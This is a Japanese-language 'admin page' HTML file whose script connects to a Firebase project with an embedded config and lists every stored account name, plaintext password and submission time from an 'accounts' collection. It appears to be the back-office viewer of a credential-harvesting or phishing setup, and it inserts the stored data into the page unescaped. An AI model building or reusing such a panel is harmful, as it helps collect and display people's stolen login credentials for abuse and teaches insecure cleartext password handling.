<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>管理者ページ</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; background: #000; color: #fff; }
    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
    th, td { border: 1px solid #fff; padding: 8px; text-align: left; }
    th { background: #222; }
  </style>
</head>
<body>
  <h1>管理者ページ</h1>
  <table>
    <thead>
      <tr><th>アカウント</th><th>パスワード</th><th>送信日時</th></tr>
    </thead>
    <tbody id="data-table">
    </tbody>
  </table>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-app.js";
    import { getFirestore, collection, getDocs, query, orderBy } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyB65yYda5Y1bVM3q74HizAQSbRrOT014x0",
      authDomain: "daada-ae048.firebaseapp.com",
      projectId: "daada-ae048",
      storageBucket: "daada-ae048.appspot.com",
      messagingSenderId: "844142280857",
      appId: "1:844142280857:web:9ced0beca7eeafd3223808",
      measurementId: "G-02E60HW9QW"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const tableBody = document.getElementById('data-table');

    async function fetchData() {
      const q = query(collection(db, "accounts"), orderBy("timestamp", "desc"));
      const snapshot = await getDocs(q);
      snapshot.forEach(doc => {
        const data = doc.data();
        const row = document.createElement('tr');
        row.innerHTML = `<td>${data.account}</td><td>${data.password}</td><td>${data.timestamp.toDate().toLocaleString()}</td>`;
        tableBody.appendChild(row);
      });
    }

    fetchData();
  </script>
</body>
</html>
